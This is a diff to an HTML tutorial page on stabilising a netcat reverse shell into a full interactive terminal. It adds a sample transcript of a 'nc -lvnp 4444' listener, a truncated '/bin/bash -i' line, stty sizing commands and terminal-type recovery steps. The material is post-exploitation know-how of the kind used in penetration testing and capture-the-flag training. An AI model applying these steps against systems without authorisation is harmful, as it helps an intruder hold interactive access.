@@ -46,8 +46,16 @@
         <div class="step-body">
           <div class="step-title">Background the session and fix local terminal state</div>
           <p>Suspend the netcat session with <code>Ctrl-Z</code>, then on the attacker side:</p>
-          <pre><code>stty raw -echo; fg
+          <pre><code>stty raw -echo;fg
 reset</code></pre>
+          <p>A real sequence doing exactly this, suspending an active listener, fixing local echo, then resuming it:</p>
+          <pre><code>toby@watcher:~/jobs$ ^Z
+zsh: suspended  nc -lvnp 4444
+
+$ stty raw -echo;fg            148 x 1
+[1]  + continued  nc -lvnp 4444
+reset
+toby@watcher:~/jobs$ echo '/bin/bash -i ...</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p><code>stty raw -echo</code> stops the local terminal from double-handling input (echoing and line-buffering) now that the remote pty is handling it instead. Backgrounding and foregrounding (<code>fg</code>) with that setting applied is what makes the shell start behaving like a real session, Ctrl-C included.</p>
@@ -59,9 +67,10 @@ reset</code></pre>
         <div class="step-num">3</div>
         <div class="step-body">
           <div class="step-title">Match the terminal size</div>
-          <p>Check the local terminal's current dimensions, then set the same values on the remote shell:</p>
-          <pre><code>stty -a
-stty rows &lt;rows&gt; columns &lt;columns&gt;</code></pre>
+          <p>Check the local terminal's current dimensions:</p>
+          <pre><code>stty -a</code></pre>
+          <p>Then set the same values on the remote shell, in this case a local 56-row, 213-column Terminator window:</p>
+          <pre><code>stty rows 56 columns 213</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
             <p>Without matching dimensions, full-screen tools (editors, pagers, anything using ncurses) render incorrectly or wrap text unpredictably. This is a cosmetic step, but it's the difference between a usable shell and a frustrating one.</p>
@@ -73,12 +82,18 @@ stty rows &lt;rows&gt; columns &lt;columns&gt;</code></pre>
         <div class="step-num">4</div>
         <div class="step-body">
           <div class="step-title">Recover when the upgrade doesn't go cleanly</div>
-          <p>Sometimes <code>reset</code> prompts for a terminal type it doesn't recognize. Answering with <code>xterm-256color</code>, or falling back to plain <code>xterm</code> if that's rejected too, usually resolves it. If the shell still isn't behaving, setting the environment directly helps:</p>
+          <p>Sometimes <code>reset</code> prompts for a terminal type it doesn't recognize, and even the first guess can get rejected too:</p>
+          <pre><code>reset: unknown terminal type unknown
+Terminal type? xterm-256color
+
+reset: unknown terminal type xterm-256color
+Terminal type? xterm</code></pre>
+          <p>If the shell still isn't behaving after that, setting the environment directly helps:</p>
           <pre><code>export TERM=xterm
 export SHELL=bash</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>A shell spawned through a reverse connection doesn't always inherit the environment variables a normal login session would. Setting <code>TERM</code> and <code>SHELL</code> explicitly fills in what a proper login would have set automatically.</p>
+            <p>A shell spawned through a reverse connection doesn't always inherit the environment variables a normal login session would. Falling back from <code>xterm-256color</code> to plain <code>xterm</code>, then setting <code>TERM</code> and <code>SHELL</code> explicitly if even that's rejected, fills in what a proper login would have set automatically.</p>
           </div>
         </div>
       </div>
